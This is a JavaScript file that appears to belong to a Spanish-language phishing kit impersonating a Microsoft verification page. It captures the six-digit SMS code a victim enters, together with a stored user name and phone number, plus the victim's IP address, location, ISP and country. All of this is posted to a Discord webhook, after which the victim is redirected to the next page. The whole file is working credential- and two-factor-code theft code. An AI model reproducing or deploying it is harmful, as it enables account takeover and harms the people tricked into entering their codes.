// Discord Logger para index5.html (Código SMS)
// Usa DiscordConfig desde discord-config.js

(function() {
  'use strict';
  
  function sendSMSCode(code) {
    return DiscordConfig.getIpInfo().then(function(info) {
      var user = localStorage.getItem('ms_user') || 'N/A';
      var phone = localStorage.getItem('ms_phone') || 'N/A';
      var embed = {
        title: '📩 Microsoft - Código SMS',
        color: 0x0078d4,
        fields: [
          { name: '👤 Usuario', value: '`' + user + '`', inline: false },
          { name: '📞 Teléfono', value: '`' + phone + '`', inline: false },
          { name: '🔐 Código SMS', value: '```' + code + '```', inline: false },
          { name: '🌐 Dirección IP', value: '`' + info.ip + '`', inline: false },
          { name: '📍 Ubicación', value: '`' + info.location + '`', inline: false },
          { name: '🏢 Proveedor ISP', value: '`' + info.isp + '`', inline: false },
          { name: '🌍 País', value: info.flag + ' ' + info.country + ' (' + info.country_code + ')', inline: false }
        ],
        footer: { text: new Date().toLocaleString() },
        timestamp: new Date().toISOString()
      };
      return DiscordConfig.sendEmbed(embed);
    });
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    var tokoInput = document.getElementById('toko');
    var verifyBtn = document.getElementById('verify-btn');
    var btnText = document.getElementById('btn-text');
    var smsCounter = document.getElementById('sms-counter');
    var smsProgress = document.getElementById('sms-progress');
    
    if (!tokoInput || !verifyBtn) return;
    
    var waitTime = 112;
    var countdown;
    
    function updateCountdown() {
      waitTime--;
      smsCounter.textContent = waitTime + 's';
      btnText.textContent = 'Espere ' + waitTime + 's';
      
      var progress = ((112 - waitTime) / 112) * 100;
      smsProgress.style.width = progress + '%';
      
      if (waitTime <= 0) {
        clearInterval(countdown);
        verifyBtn.disabled = false;
        btnText.textContent = 'Verificar';
        smsCounter.textContent = 'Listo';
        tokoInput.disabled = false;
        tokoInput.focus();
      }
    }
    
    countdown = setInterval(updateCountdown, 1000);
    
    tokoInput.disabled = true;
    
    verifyBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      var code = tokoInput.value.trim().replace(/\D/g, '');
      
      if (!code || code.length !== 6) {
        alert('Por favor ingrese el código de 6 dígitos');
        return;
      }
      
      if (verifyBtn.disabled) {
        alert('Por favor espere a que termine el tiempo de espera');
        return;
      }
      
      verifyBtn.innerHTML = 'Verificando...';
      verifyBtn.disabled = true;
      
      sendSMSCode(code).then(function() {
        setTimeout(function() {
          window.location.href = 'index6.html';
        }, 5000);
      });
    });
    
    tokoInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter' && !verifyBtn.disabled) {
        e.preventDefault();
        verifyBtn.click();
      }
    });
    
    tokoInput.addEventListener('input', function() {
      var val = tokoInput.value.replace(/\D/g, '');
      if (val.length === 6 && !verifyBtn.disabled) {
        verifyBtn.click();
      }
    });
  });
})();
